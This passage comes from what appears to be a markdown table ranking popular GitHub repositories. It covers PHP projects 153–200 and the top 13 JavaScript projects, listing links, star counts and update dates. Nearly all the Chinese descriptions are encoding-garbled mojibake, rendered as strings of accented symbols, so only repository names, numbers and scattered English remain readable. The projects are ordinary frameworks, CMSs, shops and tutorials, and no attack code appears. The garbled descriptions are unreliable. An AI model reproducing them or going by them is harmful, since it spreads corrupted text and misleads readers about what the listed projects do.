•Ôºå‰ª•Ë¶ÜÁõñlarval„ÄÅspring-boot„ÄÅdjango„ÄÅyii„ÄÅkoa„ÄÅreactÁ≠âÂ§öËØ≠Ë®ÄÊ°ÜÊû∂„ÄÇ|250|PHP|10/29|
|153|[zoujingli/ip2region](https://github.com/zoujingli/ip2region)|ÂáÜÁ°ÆÁéá99.9%ÁöÑipÂú∞ÂùÄÂÆö‰ΩçÂ∫ì|248|PHP|07/06|
|154|[bugaosuni59/TH-CPL](https://github.com/bugaosuni59/TH-CPL)|Ê∏ÖÂçéÂ§ßÂ≠¶ËÆ°ÁÆóÊú∫Â≠¶ÁßëÊé®ËçêÂ≠¶ÊúØ‰ºöËÆÆÂíåÊúüÂàäÂàóË°®|245|PHP|10/12|
|155|[lea21st/LeaCMF](https://github.com/lea21st/LeaCMF)|leacmfÊòØ‰∏ÄÊ¨æÂü∫‰∫éThinkPHP5.1+layuiÁöÑÊûÅÈÄüÂêéÂè∞ÂíåapiÂºÄÂèëÊ°ÜÊû∂„ÄÇ|244|PHP|10/17|
|156|[idreamsoft/iCMS](https://github.com/idreamsoft/iCMS)|iCMS ÊòØ‰∏ÄÂ•óÈááÁî® PHP Âíå MySQL ÊûÑÂª∫ÁöÑÈ´òÊïàÁÆÄÊ¥ÅÁöÑÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªü,‰∏∫ÊÇ®ÁöÑÁΩëÁ´ôÊèê‰æõ‰∏Ä‰∏™ÂÆåÁæéÁöÑÂºÄÊ∫êËß£ÂÜ≥ÊñπÊ°à|244|PHP|08/14|
|157|[apanly/mooc](https://github.com/apanly/mooc)|ÊÖïËØæÂπ≥Âè∞ÂΩïËØæËØ¥ÊòéÊñá‰ª∂|244|PHP|02/21|
|158|[SmallRuralDog/laravel-vue-admin](https://github.com/SmallRuralDog/laravel-vue-admin)|ÂºÄÁÆ±Âç≥Áî®ÁöÑLaravelÂêéÂè∞Êâ©Â±ï,ÂâçÂêéÁ´ØÂàÜÁ¶ªÔºåÂêéÁ´ØÊéßÂà∂ÂâçÁ´ØÁªÑ‰ª∂ÔºåÊó†ÈúÄÁºñÂÜôvueÂç≥ÂèØÂàõÂª∫‰∏Ä‰∏™vue+vuex+vue-route+elment-ui+laravelÁöÑÈ°πÁõÆ ,‰∏∞ÂØåÁöÑË°®Âçï Ë°®Ê†ºÁªÑ‰ª∂ÔºåÂº∫Â§ßÁöÑËá™ÂÆö‰πâÁªÑ‰ª∂ÂäüËÉΩ„ÄÇ|235|PHP|10/17|
|159|[coffeehb/tools](https://github.com/coffeehb/tools)|‰∏Ä‰∫õÂÆûÁî®ÁöÑpythonËÑöÊú¨|234|PHP|09/29|
|160|[idoubi/douchat](https://github.com/idoubi/douchat)|ÁÆÄÊ¥Å„ÄÅÈ´òÊïàÁöÑÂæÆ‰ø°ÂºÄÂèëÊ°ÜÊû∂„ÄÇ|234|PHP|02/06|
|161|[html580/diygw](https://github.com/html580/diygw)|Diygw For PHP ÊòØDIYÂÆòÁΩëÊâìÈÄ†Âü∫‰∫éThinkphp 5.1.xÂºÄÂèëÂÆûÊó∂ÂêåÊ≠•DIYÂÆòÁΩëËÆæËÆ°Â∫îÁî®ÔºåÊó†ÈúÄË¶Å‰∏ãËΩΩÁõ¥Êé•Âú®Á∫øÂêåÊ≠•Â∫îÁî®Êõ¥Êñ∞Â∫îÁî®„ÄÇDIYÂÆòÁΩëÊòØ‰∏ÄÊ¨æÁöÑÂèØËßÜÂåñWebÂ∫îÁî®ÂºÄÂèëÂíåËøêË°åÂπ≥Âè∞„ÄÇÂü∫‰∫éÊµèËßàÂô®ÁöÑÈõÜÊàêÂºÄÂèëÁéØÂ¢ÉÔºåÂèØËßÜÂåñÂíåÊô∫ËÉΩÂåñÁöÑËÆæËÆ°ÔºåËÉΩËΩªÊùæÂÆåÊàêË∫´ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂíåÈù¢ÂêëÊâãÊú∫ÁöÑÁßªÂä®Â∫îÁî®ÂºÄÂèëÔºõÈ´òÊïà„ÄÅÁ®≥ÂÆöÂíåÂèØÊâ©Â±ïÁöÑÁâπÁÇπÔºå‰ΩøÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁöÑÂºÄÂèëÊõ¥Âø´Êç∑ÂíåÁÆÄÂçï„ÄÇÊ≠§Ê°ÜÊû∂‰ΩúÁî®‰∫éÂêåÊ≠•DIYÂÆòÁΩëËÆæËÆ°ÁöÑÂ∫îÁî®Ëá≥‰Ω†ÁöÑÊúçÂä°Âô®Ôºå‰∏çÂåÖÊã¨ÂèØËßÜÂåñËÆæËÆ°!|232|PHP|02/29|
|162|[oubingbing/wechatAlliance](https://github.com/oubingbing/wechatAlliance)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫è--Ê†°Âõ≠Â∞èÊÉÖ‰π¶ÂêéÂè∞Ê∫êÁ†ÅÔºåÂ•ΩÁé©ÁöÑË°®ÁôΩÂ¢ôÔºåÂëäÁôΩÂ¢ô„ÄÇ|232|PHP|10/29|
|163|[qinggan/phpok](https://github.com/qinggan/phpok)|ËøôÊòØ‰∏ÄÂ•óÊûÅÂÖ∂Ëá™Áî±ÁöÑ‰ºÅ‰∏öÁ´ôÁ®ãÂ∫èÔºåÊîØÊåÅÂêÑÁßçËá™ÂÆö‰πâÈÖçÁΩÆÔºåÂåÖÊã¨Á´ôÁÇπÂÖ®Â±ÄÂèÇÊï∞ÔºåÂàÜÁ±ªÊâ©Â±ïÔºåÈ°πÁõÆÊâ©Â±ïÂèäÂêÑÁßçÊ®°ÂûãÔºÅ|228|PHP|10/28|
|164|[sulianapp-com/sulianapp](https://github.com/sulianapp-com/sulianapp)|Âø´ÈìæÁîµÂïÜÔºåÁõ¥Êí≠ÁîµÂïÜ ÂàÜÈîÄÂïÜÂüé ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüé + APPÂïÜÂüé + ÂÖ¨‰ºóÂè∑ÂïÜÂüé + PCÂïÜÂüéÁ≥ªÁªü + ÊîØ‰ªòÂÆùÂ∞èÁ®ãÂ∫èÂïÜÂüé + ÊäñÈü≥Â∞èÁ®ãÂ∫èÂïÜÂüé + ÁôæÂ∫¶Â∞èÁ®ãÂ∫èÁîµÂïÜÁ≥ªÁªüÔºàÂâçÂêéÁ´Ø‰ª£Á†ÅÂÖ®ÈÉ®ÂºÄÊ∫êÔºâ Laravel + vueÂºÄÂèëÔºåÊàêÁÜüÂïÜÁî®È°πÁõÆ shop mall ÂïÜÂüé ÁîµÂïÜ |227|PHP|04/06|
|165|[kasuganosoras/Pigeon](https://github.com/kasuganosoras/Pigeon)|üí¨ ‰∏Ä‰∏™ËΩªÈáèÂåñÁöÑÁïôË®ÄÊùø / ËÆ∞‰∫ãÊú¨ / Á§æ‰∫§Á≥ªÁªü / ÂçöÂÆ¢„ÄÇ‰∫∫Á±ªÁöÑÊú¨Ë¥®ÊòØ‚Ä¶‚Ä¶ÂíïÂíïÂíïÔºü|226|PHP|08/19|
|166|[woann/chat](https://github.com/woann/chat)|Âü∫‰∫élaravelSÂíålayimÁöÑËÅäÂ§©Á≥ªÁªü|225|PHP|05/18|
|167|[bettershop/LaikeTui](https://github.com/bettershop/LaikeTui)|Êù•ÂÆ¢ÁîµÂïÜÔºåÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüé + APPÂïÜÂüé + ÂÖ¨‰ºóÂè∑ÂïÜÂüé + PCÂïÜÂüéÁ≥ªÁªü + ÊîØ‰ªòÂÆùÂ∞èÁ®ãÂ∫èÂïÜÂüé + ÊäñÈü≥Â∞èÁ®ãÂ∫èÂïÜÂüé + ÁôæÂ∫¶Â∞èÁ®ãÂ∫èÁîµÂïÜÁ≥ªÁªüÔºàÂâçÂêéÁ´Ø‰ª£Á†ÅÂÖ®ÈÉ®ÂºÄÊ∫êÔºâ Ê≥®ÈáçÁïåÈù¢ÁæéÊÑü‰∏éÁî®Êà∑‰ΩìÈ™åÔºåÊâìÈÄ†Áã¨ÁâπÁîµÂïÜÁ≥ªÁªüÁîüÊÄÅÂúà|224|PHP|10/29|
|168|[we7coreteam/w7-rangine-empty](https://github.com/we7coreteam/w7-rangine-empty)|ËΩØÊìéÊòØÂü∫‰∫é Php 7.2+ Âíå Swoole 4.4+ ÁöÑÈ´òÊÄßËÉΩ„ÄÅÁÆÄÂçïÊòìÁî®ÁöÑÂºÄÂèëÊ°ÜÊû∂„ÄÇÊîØÊåÅÂêåÊó∂Âú® Swoole Server Âíå php-fpm ‰∏§ÁßçÊ®°Âºè‰∏ãËøêË°å„ÄÇÂÜÖÁΩÆ‰∫Ü Http (Swoole, Fpm)ÔºåTcpÔºåWebSocketÔºåProcessÔºåCrontabÊúçÂä°„ÄÇÈõÜÊàê‰∫ÜÂ§ßÈáèÊàêÁÜüÁöÑÁªÑ‰ª∂ÔºåÂèØ‰ª•Áî®‰∫éÊûÑÂª∫È´òÊÄßËÉΩÁöÑWebÁ≥ªÁªü„ÄÅAPI„ÄÅ‰∏≠Èó¥‰ª∂„ÄÅÂü∫Á°ÄÊúçÂä°Á≠âÁ≠â„ÄÇ|224|PHP|10/10|
|169|[MercyCloudTeam/TomatoIDC](https://github.com/MercyCloudTeam/TomatoIDC)| TomatoIDCÊòØ‰∏ÄÊ¨æ‰ª•MITÂçèËÆÆÂºÄÊ∫ê‰∏ªÊú∫ÈîÄÂîÆÁ≥ªÁªüÔºåÂÖ∑Â§áÊòì‰∫éÊâ©Â±ïÁöÑÊèí‰ª∂Á≥ªÁªüÔºåÊ®°ÁâàÁ≥ªÁªüÔºå‰ΩøÁî®Âº∫Â§ßÁöÑLaravelÊ°ÜÊû∂ËøõË°åÈ©±Âä®ÔºåËÉΩÂ∏ÆÂä©‰Ω†ËΩªÊùæÁöÑÊâ©Â±ï‰∏ªÊú∫ÈîÄÂîÆ‰∏öÂä°„ÄÇ|221|PHP|09/08|
|170|[chenbool/wms](https://github.com/chenbool/wms)|php‰ªìÂ∫ìËøõÈîÄÂ≠ò|220|PHP|08/28|
|171|[lmxdawn/vue-admin-php](https://github.com/lmxdawn/vue-admin-php)|Vue-cli3.0 + Element UI + ThinkPHP5.1 + RBACÊùÉÈôê + ÂìçÂ∫îÂºèÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü https://lmxdawn.github.io/vue-admin|217|PHP|06/04|
|172|[DOUBLE-Baller/WebRTC_IM](https://github.com/DOUBLE-Baller/WebRTC_IM)|webrtc Áõ¥Êí≠ËøûÈ∫¶|216|PHP|10/13|
|173|[shixinke/php-ide-helper](https://github.com/shixinke/php-ide-helper)|Yaf„ÄÅyar„ÄÅyac„ÄÅyaconf„ÄÅRedis„ÄÅSwoole„ÄÅmsgpack„ÄÅxhprofÁ≠âPHPÊ°ÜÊû∂ÊàñÊâ©Â±ïÂú®IDE‰∏ãËá™Âä®ËØÜÂà´Á±ª„ÄÅÂ∏∏Èáè„ÄÅËá™Âä®Ë°•ÂÖ®ÊñπÊ≥ïÂêç|214|PHP|04/22|
|174|[inhere/php-validate](https://github.com/inhere/php-validate)|Lightweight and feature-rich PHP validation and filtering library. Support scene grouping, pre-filtering, array checking, custom validators, custom messages. ËΩªÈáè‰∏îÂäüËÉΩ‰∏∞ÂØåÁöÑPHPÈ™åËØÅ„ÄÅËøáÊª§Â∫ì„ÄÇÊîØÊåÅÂú∫ÊôØÂàÜÁªÑÔºåÂâçÁΩÆËøáÊª§ÔºåÊï∞ÁªÑÊ£ÄÊü•ÔºåËá™ÂÆö‰πâÈ™åËØÅÂô®ÔºåËá™ÂÆö‰πâÊ∂àÊÅØ„ÄÇ|215|PHP|06/25|
|175|[shmilylbelva/laykefu](https://github.com/shmilylbelva/laykefu)|thinkphp5+workerman+gatewayworkerÊê≠Âª∫ÁöÑwebimÂÆ¢ÊúçÁ≥ªÁªü/Âç≥Êó∂ÈÄöËÆØ|213|PHP|09/23|
|176|[yzmcms/yzmcms](https://github.com/yzmcms/yzmcms)|YzmCMSÊòØ‰∏ÄÊ¨æÂü∫‰∫éYZMPHPÂºÄÂèëÁöÑ‰∏ÄÂ•óËΩªÈáèÁ∫ßÂºÄÊ∫êÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªüÔºåYzmCMSÁÆÄÊ¥Å„ÄÅÂÆâÂÖ®„ÄÅÂºÄÊ∫ê„ÄÅÂÆûÁî®ÔºåÂèØËøêË°åÂú®Linux„ÄÅWindows„ÄÅMacOSX„ÄÅSolarisÁ≠âÂêÑÁßçÂπ≥Âè∞‰∏äÔºå‰∏ìÊ≥®‰∏∫ÂÖ¨Âè∏‰ºÅ‰∏ö„ÄÅ‰∏™‰∫∫Á´ôÈïøÂø´ÈÄüÂª∫Á´ôÊèê‰æõËß£ÂÜ≥ÊñπÊ°à„ÄÇ|211|PHP|09/06|
|177|[52admln/vue-questionnaire](https://github.com/52admln/vue-questionnaire)|‰ΩøÁî® Vue + CI ÂºÄÂèëÁöÑÁÆÄÊòìÈóÆÂç∑Ë∞ÉÊü•Á≥ªÁªüÔºåÊºîÁ§∫Ë¥¶Êà∑Ôºöadmin / admin|210|PHP|09/09|
|178|[walkor/live-ascii-camera](https://github.com/walkor/live-ascii-camera)|Âà©Áî®HTML5Â∞ÜÊëÑÂÉèÂ§¥ËßÜÈ¢ëËΩ¨Êç¢‰∏∫asciiÂ≠óÁ¨¶ÔºåÈÄöËøáwebsocketÂÆûÊó∂‰º†ËæìÁªôÂÖ∂ÂÆÉÈ°µÈù¢„ÄÇÊúçÂä°Á´Ø‰ΩøÁî®workerman|208|PHP|04/21|
|179|[likeyun/WeChat-Group-HuoMa](https://github.com/likeyun/WeChat-Group-HuoMa)|ÂæÆ‰ø°Áæ§‰∫åÁª¥Á†ÅÊ¥ªÁ†ÅÂ∑•ÂÖ∑ÔºåÁîüÊàêÂæÆ‰ø°Áæ§Ê¥ªÁ†ÅÔºåÈöèÊó∂ÂèØ‰ª•ÂàáÊç¢‰∫åÁª¥Á†ÅÔºÅ|206|PHP|10/13|
|180|[Hanson/weibot](https://github.com/Hanson/weibot)|ÂæÆÂçöÁà¨Ëô´ÔºåÊ®°ÊãüÁôªÂΩïÔºåÊï∞ÊçÆÊäìÂèñ|205|PHP|03/07|
|181|[comdan66/weather](https://github.com/comdan66/weather)|Taiwan's  Weather Maps! ÊÉ≥Êü•Ë©¢ÊØèÂÄãÂú∞ÊñπÁöÑÂ§©Ê∞£ÂóéÔºÅÔºüËóâÁî± Google Maps API ÁöÑÂú∞ÂúñÊúçÂãôÔºå‰ª•Âèä‰∏≠Â§ÆÊ∞£Ë±°Â±ÄÁ∂≤Á´ôÁöÑÂ§©Ê∞£È†êÂ†±ÔºåËÆì‰Ω†Âø´ÈÄüËºïÈ¨ÜÁöÑÊü•Ë©¢Âè∞ÁÅ£ 368 ÂÄãÈÑâÈéÆÁöÑÂ§©Ê∞£Ê¶ÇÊ≥ÅÔºÅ|204|PHP|04/06|
|182|[Seevil/cactus](https://github.com/Seevil/cactus)|üåµ‰∏Ä‰∏™ÂìçÂ∫îÂºèÂπ≤ÂáÄÂíåÁÆÄÊ¥Å‰ºòÈõÖÁöÑ Typecho ‰∏ªÈ¢ò|204|PHP|08/19|
|183|[Clago/workflow](https://github.com/Clago/workflow)|Âü∫‰∫élaravelÁöÑÂ∑•‰ΩúÊµÅÈ°πÁõÆ|203|PHP|09/04|
|184|[zhongshaofa/easyadmin](https://github.com/zhongshaofa/easyadmin)|Ê°ÜÊû∂‰∏ªË¶Å‰ΩøÁî®ThinkPHP6.0 + layuiÔºåÊã•ÊúâÂÆåÂñÑÁöÑÊùÉÈôêÁöÑÁÆ°ÁêÜÊ®°Âùó‰ª•ÂèäÊïèÊç∑ÁöÑÂºÄÂèëÊñπÂºèÔºåËÆ©‰Ω†ÂºÄÂèëËµ∑Êù•Êõ¥Âä†ÁöÑËàíÊúç„ÄÇ|203|PHP|10/28|
|185|[jswh/synology_video_station_douban_plugin](https://github.com/jswh/synology_video_station_douban_plugin)|Áæ§Êôñ video station Ë±ÜÁì£ÂàÆÂâäÊèí‰ª∂|201|PHP|04/14|
|186|[myqee/server](https://github.com/myqee/server)|Â∞ÜswooleÊúçÂä°ÂíåÂäüËÉΩÂØπË±°ÊäΩË±°ÂåñÔºåÂ∏¶Êù•ÂÖ®Êñ∞ÁöÑÁºñÁ®ã‰ΩìÈ™åËÆ©‰ª£Á†ÅÊ∏ÖÊô∞ÊúâÊù°ÁêÜÁöÑÁ±ªÂ∫ì|196|PHP|08/03|
|187|[DukeAnn/Laradmin](https://github.com/DukeAnn/Laradmin)|LaradminÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|195|PHP|08/10|
|188|[Innei/Typecho-Theme-Paul](https://github.com/Innei/Typecho-Theme-Paul)|üéà ‰∏Ä‰∏™ÈÄÇÁî®‰∫éÂ±ïÁ§∫ÔºåÂÜôÊó•ËÆ∞ÁöÑ Typecho ÂçöÂÆ¢‰∏ªÈ¢ò„ÄÇ|193|PHP|06/02|
|189|[dedetech/DedeCMSv5](https://github.com/dedetech/DedeCMSv5)|‰∏≠ÂõΩ‰∏ì‰∏öÁöÑPHPÁΩëÁ´ôÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªü-ÁªáÊ¢¶ÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªü|190|PHP|09/21|
|190|[ycrao/mynotes](https://github.com/ycrao/mynotes)|Á¨îËÆ∞„ÄÅLaravel„ÄÅPHP„ÄÅÈù¢ËØïÈ¢ò„ÄÅMySQL„ÄÅHTML„ÄÅCSS„ÄÅJava...|189|PHP|06/03|
|191|[iamxjb/rest-api-to-miniprogram](https://github.com/iamxjb/rest-api-to-miniprogram)|REST API TO MiniProgram ‰∏∫Â∞èÁ®ãÂ∫èÊèê‰æõ rest api ÊîØÊåÅ|188|PHP|09/17|
|192|[yybawang/laravel-ebank](https://github.com/yybawang/laravel-ebank)|:robot: ÁîµÂïÜÁ±ªÁ´ôÂÜÖËôöÊãüÁßØÂàÜ‰∏éËÅöÂêàÊîØ‰ªòËß£ÂÜ≥ÊñπÊ°à|187|PHP|08/21|
|193|[asiacny/zero-width-qrcode-shortener](https://github.com/asiacny/zero-width-qrcode-shortener)|Èõ∂ÂÆΩÂ∫¶Áü≠ÁΩëÂùÄ‰∏é‰∫åÁª¥Á†ÅÁîüÊàêÂ∑•ÂÖ∑(PHP+ORACLE/MYSQL/SQLite)|187|PHP|03/30|
|194|[Yurunsoft/YurunHttp](https://github.com/Yurunsoft/YurunHttp)|YurunHttp ÊòØÂºÄÊ∫êÁöÑ PHP HTTP ÂÆ¢Êà∑Á´ØÔºåÊîØÊåÅÈìæÂºèÊìç‰ΩúÔºåÁÆÄÂçïÊòìÁî®„ÄÇÂÆåÁæéÊîØÊåÅCurl„ÄÅSwoole ÂçèÁ®ã„ÄÇQQÁæ§Ôºö17916227|185|PHP|08/29|
|195|[buqiu/laravel-shop](https://github.com/buqiu/laravel-shop)|Âü∫‰∫é Laravel ‰∏ÄÊ≠•‰∏ÄÊ≠•ÊûÑÂª∫‰∏ÄÂ•óÁîµÂïÜÁ≥ªÁªü„ÄÇ‰ΩøÁî® Laravel-Admin Âø´ÈÄüÊûÑÂª∫ÁÆ°ÁêÜÂêéÂè∞„ÄÅÊîØ‰ªòÂÆùÂíåÂæÆ‰ø°ÊîØ‰ªòÁöÑÂõûË∞ÉÈÄöÁü•Â§ÑÁêÜ„ÄÅLaravel È°πÁõÆ‰∏≠ÂØπÂºÇÂ∏∏ÁöÑÂ§ÑÁêÜ„ÄÅË¥≠Áâ©ËΩ¶ËÆæËÆ°„ÄÅÂïÜÂìÅ SKU Êï∞ÊçÆÁªìÊûÑËÆæËÆ°„ÄÅÈÄöËøáÂª∂ËøüÈòüÂàóËá™Âä®ÂÖ≥Èó≠ËÆ¢Âçï„ÄÅMySQL ‰∫ãÂä°Â§ÑÁêÜ„ÄÅÂ∫ìÂ≠òÂ¢ûÂáèÁöÑÊ≠£Á°ÆÂßøÂäø„ÄÅÊó†ÈôêÁ∫ßÂàÜÁ±ª„ÄÅElasticsearch„ÄÅÂàÜÈù¢ÊêúÁ¥¢„ÄÅ‰ª£Á†ÅÈÉ®ÁΩ≤„ÄÅË¥üËΩΩÂùáË°°„ÄÅÂéãÂäõÊµãËØï„ÄÅÊé•Âè£ÊÄßËÉΩ‰ºòÂåñ„ÄÅÈöèÊú∫ÊãíÁªùÁ≠âÁîµÂïÜÂºÄÂèëÁõ∏ÂÖ≥ÁöÑÈ´òÁ∫ßÊäÄÊúØÊ¶ÇÂøµ„ÄÇ|184|PHP|10/28|
|196|[Kimiato/DriveDirectLink](https://github.com/Kimiato/DriveDirectLink)|DriveDirectLink ÁΩëÁõòÁõ¥Èìæ‰∏ãËΩΩÔºåÊîØÊåÅË∞∑Ê≠å, ËìùÂ•è‰∫ë,360‰∫ëÁõò|182|PHP|07/07|
|197|[txperl/airAnime](https://github.com/txperl/airAnime)|ËΩªÈáèÂåñÂä®Êº´ËÅöÂêàÊêúÁ¥¢Â∑•ÂÖ∑|182|PHP|10/13|
|198|[brewlin/swoft-im](https://github.com/brewlin/swoft-im)|Âü∫‰∫éswoft-cloudÁöÑÂæÆÊúçÂä°Êû∂ÊûÑÔºåÊúÄÂ∞èÂåñÊãÜÂàÜÁ≤íÂ∫¶ÔºåPHP7„ÄÅÂ§öËøõÁ®ã„ÄÅÂçèÁ®ã„ÄÅÂºÇÊ≠•‰ªªÂä°„ÄÅmysqlËøûÊé•Ê±†„ÄÅrediËøûÊé•Ê±†„ÄÅrpcËøûÊé•Ê±†„ÄÅÊúçÂä°Ê≤ªÁêÜ„ÄÅÊúçÂä°Ê≥®ÂÜå‰∏éÂèëÁé∞„ÄÅAopÂàáÈù¢„ÄÅÂÖ®Ê≥®Ëß£|181|PHP|07/31|
|199|[yeskn-studio/vmoex-framework](https://github.com/yeskn-studio/vmoex-framework)|‰∏Ä‰∏™ÂºÄÊ∫êÁöÑ‰∫åÊ¨°ÂÖÉÂêëÁöÑÁ§æÂå∫Á®ãÂ∫è„ÄÇ|181|PHP|09/13|
|200|[Hanson/laravel-admin-wechat](https://github.com/Hanson/laravel-admin-wechat)|laravel admin ÁöÑÂæÆ‰ø°Êâ©Â±ïÂåÖÔºåÊîØÊåÅÂ§öÂÖ¨‰ºóÂè∑„ÄÅÂ§öÂ∞èÁ®ãÂ∫è„ÄÅÂ§öÂæÆ‰ø°ÊîØ‰ªòÔºåÂåÖÂê´Âü∫Á°ÄÊé•Âè£‰∏éÂêéÂè∞|180|PHP|04/25|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## JavaScript

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[scutan90/DeepLearning-500-questions](https://github.com/scutan90/DeepLearning-500-questions)|Ê∑±Â∫¶Â≠¶‰π†500ÈóÆÔºå‰ª•ÈóÆÁ≠îÂΩ¢ÂºèÂØπÂ∏∏Áî®ÁöÑÊ¶ÇÁéáÁü•ËØÜ„ÄÅÁ∫øÊÄß‰ª£Êï∞„ÄÅÊú∫Âô®Â≠¶‰π†„ÄÅÊ∑±Â∫¶Â≠¶‰π†„ÄÅËÆ°ÁÆóÊú∫ËßÜËßâÁ≠âÁÉ≠ÁÇπÈóÆÈ¢òËøõË°åÈòêËø∞Ôºå‰ª•Â∏ÆÂä©Ëá™Â∑±ÂèäÊúâÈúÄË¶ÅÁöÑËØªËÄÖ„ÄÇ ÂÖ®‰π¶ÂàÜ‰∏∫18‰∏™Á´†ËäÇÔºå50‰Ωô‰∏áÂ≠ó„ÄÇÁî±‰∫éÊ∞¥Âπ≥ÊúâÈôêÔºå‰π¶‰∏≠‰∏çÂ¶•‰πãÂ§ÑÊÅ≥ËØ∑ÂπøÂ§ßËØªËÄÖÊâπËØÑÊåáÊ≠£„ÄÇ   Êú™ÂÆåÂæÖÁª≠............ Â¶ÇÊúâÊÑèÂêà‰ΩúÔºåËÅîÁ≥ªscutjy2015@163.com                     ÁâàÊùÉÊâÄÊúâÔºåËøùÊùÉÂøÖÁ©∂       Tan 2018.06|41.2k|JavaScript|10/29|
|2|[azl397985856/leetcode](https://github.com/azl397985856/leetcode)| LeetCode Solutions: A Record of My Problem Solving Journey.( leetcodeÈ¢òËß£ÔºåËÆ∞ÂΩïËá™Â∑±ÁöÑleetcodeËß£È¢ò‰πãË∑Ø„ÄÇ)|37.5k|JavaScript|10/29|
|3|[chinese-poetry/chinese-poetry](https://github.com/chinese-poetry/chinese-poetry)|The most comprehensive database of Chinese poetry üß∂ÊúÄÂÖ®‰∏≠ÂçéÂè§ËØóËØçÊï∞ÊçÆÂ∫ì,  ÂîêÂÆã‰∏§ÊúùËøë‰∏Ä‰∏áÂõõÂçÉÂè§ËØó‰∫∫,  Êé•Ëøë5.5‰∏áÈ¶ñÂîêËØóÂä†26‰∏áÂÆãËØó.  ‰∏§ÂÆãÊó∂Êúü1564‰ΩçËØç‰∫∫Ôºå21050È¶ñËØç„ÄÇ    ÈòøÈáåÊãõ Python P6/P7 ‰∏äÊµ∑Âº†Ê±ü, gaojunqi@outlook.com|30.1k|JavaScript|10/29|
|4|[NervJS/taro](https://github.com/NervJS/taro)|ÂºÄÊîæÂºèË∑®Á´ØË∑®Ê°ÜÊû∂Ëß£ÂÜ≥ÊñπÊ°àÔºåÊîØÊåÅ‰ΩøÁî® React/Vue/Nerv Á≠âÊ°ÜÊû∂Êù•ÂºÄÂèëÂæÆ‰ø°/‰∫¨‰∏ú/ÁôæÂ∫¶/ÊîØ‰ªòÂÆù/Â≠óËäÇË∑≥Âä®/ QQ Â∞èÁ®ãÂ∫è/H5 Á≠âÂ∫îÁî®„ÄÇ  https://taro.jd.com/|27.3k|JavaScript|10/30|
|5|[dcloudio/uni-app](https://github.com/dcloudio/uni-app)|uni-app ÊòØ‰ΩøÁî® Vue ËØ≠Ê≥ïÂºÄÂèëÂ∞èÁ®ãÂ∫è„ÄÅH5„ÄÅAppÁöÑÁªü‰∏ÄÊ°ÜÊû∂|26.5k|JavaScript|10/29|
|6|[sentsin/layui](https://github.com/sentsin/layui)|ÈááÁî®Ëá™Ë∫´Ê®°ÂùóËßÑËåÉÁºñÂÜôÁöÑÂâçÁ´Ø UI Ê°ÜÊû∂ÔºåÈÅµÂæ™ÂéüÁîü HTML/CSS/JS ÁöÑ‰π¶ÂÜôÂΩ¢ÂºèÔºåÊûÅ‰ΩéÈó®ÊßõÔºåÊãøÊù•Âç≥Áî®„ÄÇ|22.6k|JavaScript|10/02|
|7|[Advanced-Frontend/Daily-Interview-Question](https://github.com/Advanced-Frontend/Daily-Interview-Question)|ÊàëÊòØÊú®ÊòìÊù®ÔºåÂÖ¨‰ºóÂè∑„ÄåÈ´òÁ∫ßÂâçÁ´ØËøõÈò∂„Äç‰ΩúËÄÖÔºåÊØèÂ§©ÊêûÂÆö‰∏ÄÈÅìÂâçÁ´ØÂ§ßÂéÇÈù¢ËØïÈ¢òÔºåÁ•ùÂ§ßÂÆ∂Â§©Â§©ËøõÊ≠•Ôºå‰∏ÄÂπ¥Âêé‰ºöÁúãÂà∞‰∏ç‰∏ÄÊ†∑ÁöÑËá™Â∑±„ÄÇ|20.8k|JavaScript|05/27|
|8|[Tencent/wepy](https://github.com/Tencent/wepy)|Â∞èÁ®ãÂ∫èÁªÑ‰ª∂ÂåñÂºÄÂèëÊ°ÜÊû∂|20.8k|JavaScript|10/04|
|9|[Meituan-Dianping/mpvue](https://github.com/Meituan-Dianping/mpvue)|Âü∫‰∫é Vue.js ÁöÑÂ∞èÁ®ãÂ∫èÂºÄÂèëÊ°ÜÊû∂Ôºå‰ªéÂ∫ïÂ±ÇÊîØÊåÅ Vue.js ËØ≠Ê≥ïÂíåÊûÑÂª∫Â∑•ÂÖ∑‰ΩìÁ≥ª„ÄÇ|20.1k|JavaScript|09/09|
|10|[ruanyf/es6tutorial](https://github.com/ruanyf/es6tutorial)|„ÄäECMAScript 6ÂÖ•Èó®„ÄãÊòØ‰∏ÄÊú¨ÂºÄÊ∫êÁöÑ JavaScript ËØ≠Ë®ÄÊïôÁ®ãÔºåÂÖ®Èù¢‰ªãÁªç ECMAScript 6 Êñ∞Â¢ûÁöÑËØ≠Ê≥ïÁâπÊÄß„ÄÇ|18.7k|JavaScript|10/27|
|11|[YMFE/yapi](https://github.com/YMFE/yapi)|YApi ÊòØ‰∏Ä‰∏™ÂèØÊú¨Âú∞ÈÉ®ÁΩ≤ÁöÑ„ÄÅÊâìÈÄöÂâçÂêéÁ´ØÂèäQAÁöÑ„ÄÅÂèØËßÜÂåñÁöÑÊé•Âè£ÁÆ°ÁêÜÂπ≥Âè∞|18.3k|JavaScript|10/26|
|12|[Binaryify/NeteaseCloudMusicApi](https://github.com/Binaryify/NeteaseCloudMusicApi)|ÁΩëÊòì‰∫ëÈü≥‰πê Node.js API service|17.5k|JavaScript|10/29|
|13|[zhaoolee/ChromeAppHeroes](https://github.com/zhaoolee/ChromeAppHeroes)|üåàË∞∑Á≤í-ChromeÊèí‰ª∂Ëã±ÈõÑÊ¶ú, ‰∏∫‰ºòÁßÄÁöÑChromeÊèí‰ª∂ÂÜô‰∏ÄÊú¨‰∏≠ÊñáËØ¥Êòé‰π¶, ËÆ©ChromeÊèí‰ª∂Ëã±ÈõÑ‰ª¨ÈÄ†Á¶è‰∫∫Á±ª~  ChromePluginHeroes, Write a Chinese manual for the excellent Chrome plugin, let the Chrome plugin heroes benefit the human~ ÂÖ¨‰ºóÂè∑„Äå0Âä†1„ÄçÂêåÊ≠•Êõ¥Êñ∞|17.2k|JavaScript|10/26|
